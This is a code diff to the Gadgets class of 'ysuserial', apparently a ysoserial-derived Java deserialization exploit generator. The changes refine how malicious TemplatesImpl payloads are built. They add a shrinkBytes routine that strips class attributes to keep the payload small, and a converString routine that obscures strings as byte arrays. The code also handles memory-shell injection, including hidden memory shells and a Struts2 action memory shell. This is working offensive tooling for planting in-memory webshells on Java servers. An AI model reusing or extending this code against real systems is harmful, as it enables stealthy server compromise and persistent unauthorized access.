@@ -2,7 +2,6 @@ package org.su18.ysuserial.payloads.util;
 
 
 import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
-import static org.su18.ysuserial.Strings.converString;
 import static org.su18.ysuserial.payloads.config.Config.*;
 import static org.su18.ysuserial.payloads.templates.MemShellPayloads.*;
 import static org.su18.ysuserial.payloads.util.ClassNameUtils.generateClassName;
@@ -18,8 +17,8 @@ import javassist.*;
 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import javassist.bytecode.*;
 import org.apache.commons.codec.binary.Base64;
-import org.apache.commons.lang.RandomStringUtils;
 import org.apache.commons.lang.StringUtils;
 
 
@@ -187,8 +186,6 @@ public class Gadgets {
 			if (IS_INHERIT_ABSTRACT_TRANSLET) {
 				ctClass.setSuperclass(superClass);
 			}
-
-			classBytes = ctClass.toBytecode();
 		}
 
 		// 如果 myClass 不为空，则说明指定了一些 Class 执行特殊功能
@@ -256,16 +253,14 @@ public class Gadgets {
 			// 如果指定继承 AbstractTranslet，统一由 ClassLoaderTemplate 加载
 			// 不搞那么麻烦写 if else 了，有长度需求自己再改吧
 			if (IS_INHERIT_ABSTRACT_TRANSLET) {
+				shrinkBytes(ctClass);
 				bytes = ctClass.toBytecode();
 				cName = ctClass.getName();
 			}
 
-			classBytes = ctClass.toBytecode();
-
 			// Struts2ActionMS 额外处理
 			if (className.contains("Struts2ActionMS")) {
 				insertField(ctClass, "thisClass", "public static String thisClass = \"" + base64Encode(classBytes) + "\";");
-				classBytes = ctClass.toBytecode();
 			}
 		}
 
@@ -285,9 +280,11 @@ public class Gadgets {
 			if (IS_INHERIT_ABSTRACT_TRANSLET) {
 				ctClass.setSuperclass(superClass);
 			}
-
-			classBytes = ctClass.toBytecode();
 		}
+
+
+		shrinkBytes(ctClass);
+		classBytes = ctClass.toBytecode();
 
 		if (HIDE_MEMORY_SHELL) {
 			switch (HIDE_MEMORY_SHELL_TYPE) {
@@ -296,7 +293,7 @@ public class Gadgets {
 				case 2:
 					CtClass newClass = pool.get("org.su18.ysuserial.payloads.templates.HideMemShellTemplate");
 					newClass.setName(generateClassName());
-					String content = "b64=\"" + Base64.encodeBase64String(ctClass.toBytecode()) + "\";";
+					String content = "b64=\"" + Base64.encodeBase64String(classBytes) + "\";";
 					String className = "className=\"" + ctClass.getName() + "\";";
 					newClass.defrost();
 					newClass.makeClassInitializer().insertBefore(content);
@@ -327,7 +324,7 @@ public class Gadgets {
 		classBytes[7] = 49;
 
 		// 储存一下生成的内存马类名及类字节码，用来给 TransformerUtil 用
-		memShellClassBytes = ctClass.toBytecode();
+		memShellClassBytes = classBytes;
 		memShellClassname = ctClass.getName();
 
 		// 恶意类是否继承 AbstractTranslet
@@ -344,7 +341,7 @@ public class Gadgets {
 		}
 
 		// required to make TemplatesImpl happy
-		Reflections.setFieldValue(templates, "_name", RandomStringUtils.randomAlphabetic(8).toUpperCase());
+		Reflections.setFieldValue(templates, "_name", "a");
 		Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
 		return templates;
 	}
@@ -606,5 +603,38 @@ public class Gadgets {
 		}
 
 		ctClass.addMethod(CtMethod.make(base64Decode(TOMCAT_NO_LOG), ctClass));
+	}
+
+	// 恶心一下人，实际没用
+	public static String converString(String target) {
+		if (IS_OBSCURE) {
+			StringBuilder result = new StringBuilder("new String(new byte[]{");
+			byte[]        bytes  = target.getBytes();
+			for (int i = 0; i < bytes.length; i++) {
+				result.append(bytes[i]).append(",");
+			}
+			return result.substring(0, result.length() - 1) + "})";
+		}
+
+		return "\"" + target + "\"";
+	}
+
+
+	// 统一处理，删除一些不影响使用的 Attribute 降低类字节码的大小
+	public static void shrinkBytes(CtClass ctClass) {
+		ClassFile classFile = ctClass.getClassFile2();
+		classFile.removeAttribute(SourceFileAttribute.tag);
+		classFile.removeAttribute(LineNumberAttribute.tag);
+		classFile.removeAttribute(LocalVariableAttribute.tag);
+		classFile.removeAttribute(LocalVariableAttribute.typeTag);
+		classFile.removeAttribute(DeprecatedAttribute.tag);
+		classFile.removeAttribute(SignatureAttribute.tag);
+		classFile.removeAttribute(StackMapTable.tag);
+
+		List<MethodInfo> list = classFile.getMethods();
+		for (MethodInfo info : list) {
+			info.removeAttribute("RuntimeVisibleAnnotations");
+			info.removeAttribute("RuntimeInvisibleAnnotations");
+		}
 	}
 }
